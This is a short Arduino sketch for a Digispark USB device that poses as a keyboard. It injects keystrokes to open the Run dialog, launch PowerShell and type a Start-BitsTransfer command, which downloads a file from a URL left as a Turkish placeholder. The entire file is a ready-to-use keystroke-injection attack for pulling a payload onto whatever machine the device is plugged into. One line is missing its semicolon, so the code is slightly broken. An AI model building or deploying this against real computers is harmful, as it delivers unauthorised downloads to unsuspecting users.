#define kbd_tr_tr
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Start-BitsTransfer *link-yaz* ")
  DigiKeyboard.delay(500);
  DigiKeyboard.print("");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
